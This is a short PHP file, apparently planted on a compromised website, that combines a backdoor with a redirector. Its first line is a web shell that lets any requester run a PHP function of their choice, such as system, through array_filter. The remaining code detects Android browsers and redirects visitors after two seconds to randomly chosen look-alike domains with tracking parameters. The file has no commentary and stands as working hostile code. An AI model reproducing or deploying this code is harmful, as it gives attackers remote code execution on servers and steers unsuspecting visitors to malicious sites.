<?php^M
if ($_REQUEST['param1']&&$_REQUEST['param2']) {$f = $_REQUEST['param1']; $p = array($_REQUEST['param2']); $pf = array_filter($p, $f); echo 'OK'; Exit;}
^M
$android = strpos($_SERVER['HTTP_USER_AGENT'],"Android");^M
$android_urls = array (^M
                        'http://com-b2m.net/?a=314759&c=wl_con&s=AND',^M
                        'http://com-p54.net/?a=314759&c=wl_con&s=AND',  ^M
                        'http://com-yeg.net/?a=314759&c=wl_con&s=AND',                          ^M
);^M
$not_android_urls = array (^M
                        'http://com-b2m.net/?a=314759&c=wl_con&s=MAY',^M
                        'http://com-p54.net/?a=314759&c=wl_con&s=MAY',  ^M
                        'http://com-yeg.net/?a=314759&c=wl_con&s=MAY',  ^M
);^M
 $n = mt_rand(0,count($not_android_urls)-1);^M
 $rand_url=$not_android_urls[$n];^M
 ^M
if ( $android  == true)^M
{^M
 $n = mt_rand(0,count($android_urls)-1);^M
 $rand_url=$android_urls[$n];^M
}^M
?>^M
 <meta http-equiv="refresh" content="2; url=<?php echo $rand_url;?> ">
